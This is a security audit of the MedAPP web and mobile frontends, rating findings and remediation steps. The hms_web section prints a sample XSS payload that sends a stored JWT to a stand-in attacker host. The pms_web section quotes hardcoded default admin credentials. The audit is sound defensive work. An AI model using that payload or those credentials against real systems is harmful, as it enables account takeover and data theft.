# MedAPP — Frontend Audit

**Date:** 2026-05-20
**Scope:** `frontend/admin_web`, `frontend/hms_web`, `frontend/pms_web`, `frontend/mobile`

---

## admin_web

### Strengths
- Minimal surface area; Next.js 14 + TypeScript baseline in place.

### Flaws / Quality
- Empty scaffold — no business logic, error boundaries, loading states, or tests.

### Security
- **HIGH** — No authentication guard. If deployed as-is, KYC / moderation / analytics
  pages would be publicly accessible.
- No Content-Security-Policy headers configured.

### Improvements
- Implement RBAC and a route guard middleware before any real content lands.
- Document the intended access model.

---

## hms_web (Hospital Management)

### Strengths
- Clean Next.js 14 App Router with `(dashboard)` route group.
- Zustand for client auth state with a hydration guard to prevent SSR mismatch.
- Full TypeScript, Zod validation, react-hook-form.
- React Query with sensible defaults (30 s `staleTime`, no refetch on focus).
- Reusable UI primitives (Badge / Button / Card / Table) — consistent design language.
- Permission-aware sidebar (`permissions.ts`).
- `Shell` component enforces an auth guard before rendering dashboard children.

### Flaws / Quality
- **No tests** — no Jest / Vitest configuration despite complex state and data flows.
- API base URL hardcoded to `http://localhost:8020` in `.env.local.example`.
- No refresh-token rotation; expired tokens are not handled gracefully.
- Tenant config also persisted in `localStorage` (`tenant-config.store.ts:72`).

### Security
- **CRITICAL** — JWT stored in `localStorage` (`auth.store.ts:57-58`). Any XSS → full
  account takeover (`document.location = 'https://attacker/?t=' + localStorage.getItem('hms_token')`).
- **CRITICAL** — Full user object (email, hospitalId, role) also serialised into
  `localStorage`.
- **HIGH** — No Content-Security-Policy in `next.config.mjs`.
- **HIGH** — No server-side route protection: a direct navigation to
  `/dashboard/patients` before hydration races the client guard.
- **HIGH** — Session-fixation risk — the app reads whatever token is in `localStorage`
  with no integrity check.
- **HIGH** — Next.js 14.2.35 has multiple advisories: `GHSA-ffhc-5mcf-pf4q` (CSP nonce
  bypass), `GHSA-gx5p-jg67-6x7h` (beforeInteractive XSS), `GHSA-h64f-5h5j-jqjh`
  (image-opt DoS), and several glob / postcss transitive issues.

### Improvements
1. Move tokens from `localStorage` to `httpOnly; Secure; SameSite=Strict` cookies; let
   Next.js middleware handle refresh.
2. Add `headers()` in `next.config.mjs` for CSP, HSTS, Referrer-Policy.
3. Implement `/v1/auth/refresh` and silent rotation on 401.
4. Add Next.js middleware that validates the cookie server-side before rendering
   dashboard pages.
5. Configure Vitest; aim for ≥ 60 % coverage on stores, repositories, and key flows.
6. Patch Next.js to the latest 14.x or upgrade.

---

## pms_web (Pharmacy Management)

### Strengths
- Same architecture as hms_web (good consistency).
- Role-aware navigation (pharmacist / cashier / pharmacy_admin).

### Flaws / Quality
- **Significant duplication with hms_web** — bug fixes will diverge.

### Security
- **CRITICAL** — Default admin credentials hardcoded in the login form:
  `frontend/pms_web/src/app/login/page.tsx:10-11` — `admin@pharmacy.local` /
  `ChangeMe!123`. These ship in the production JS bundle.
- **CRITICAL** — JWT in `localStorage` (same as hms_web).
- **HIGH** — No CSP headers.
- **HIGH** — No CSRF protection on POST forms.

### Improvements
1. **Delete the hardcoded credentials immediately** (lines 10-11).
2. Migrate token storage to `httpOnly` cookies.
3. Add CSP headers.
4. Extract `auth.store`, `api/client`, `permissions`, and UI primitives into
   `packages/web-shared/` (or similar) so hms_web and pms_web share them.
5. CSRF tokens on POST / PUT / DELETE.

---

## mobile (React Native / Expo)

### Strengths
- **Secure token storage** via `expo-secure-store` (iOS Keychain / Android Keystore).
- API client reads the token from secure storage on every request — nothing cached in
  JS memory (`apiClient.ts:11-18`).
- `authRepository.me()` revalidates the token on app start.
- Environment-aware config via `expo-constants`; separate dev/preview/prod URLs.
- Full TypeScript, no `any` in the auth path.
- Mock-API toggle (`env.useMockApi`) cleanly gates dev fixtures.

### Flaws / Quality
- **MEDIUM** — No `package-lock.json` committed; `npm audit` cannot run; dependency
  reproducibility is uncertain.
- No refresh-token persistence — sessions die without graceful recovery.

### Security
- **LOW** — Mock-auth credentials visible in source (`authRepository.ts:55`) — but
  gated by `env.useMockApi`, so only present in dev builds.
- **LOW** — No certificate pinning — MITM risk on untrusted networks (cafe / airport
  Wi-Fi).

### Improvements
1. Run `npm install` to produce `package-lock.json`; commit it; run `npm audit`.
2. Add refresh-token flow (store in secure-store; rotate on 401).
3. Add certificate pinning for the production API.
4. Consider AsyncStorage for non-sensitive offline cache.

---

## Cross-app issues

### Code duplication

| Component | admin_web | hms_web | pms_web | mobile |
|-----------|-----------|---------|---------|--------|
| Auth store | – | yes | yes (duplicate) | yes |
| API client | – | yes | yes (duplicate) | yes |
| Permissions | – | yes | – | – |

Extract into `packages/` so a single fix flows everywhere.

### Vulnerable dependencies (web)

- **Next.js 14.2.35** — `GHSA-ffhc-5mcf-pf4q`, `GHSA-gx5p-jg67-6x7h`, `GHSA-h64f-5h5j-jqjh`.
- **glob 10.2.0–10.4.5** (via `eslint-config-next`) — `GHSA-5j98-mcp5-4vw2`.
- **postcss < 8.5.10** — `GHSA-qx2v-qp2m-jg93`.

---

## Priority matrix

| Issue | Severity | Effort | Do first |
|-------|----------|--------|----------|
| Remove hardcoded PMS credentials | CRITICAL | XS | 1 |
| JWT → `httpOnly` cookies on both web apps | CRITICAL | M | 2 |
| Add CSP / HSTS headers | CRITICAL | S | 3 |
| Patch Next.js + transitive CVEs | HIGH | M | 4 |
| Refresh-token rotation | HIGH | M | 5 |
| Extract shared packages | MEDIUM | M | 6 |
| Test setup (Vitest) | MEDIUM | M | 7 |
| Mobile `package-lock.json` | MEDIUM | XS | 8 |
| Certificate pinning (mobile) | LOW | M | 9 |

---

## Severity tally — frontend

| Severity | Count |
|----------|-------|
| CRITICAL | 4 |
| HIGH     | 7 |
| MEDIUM   | 6 |
| LOW      | 3 |
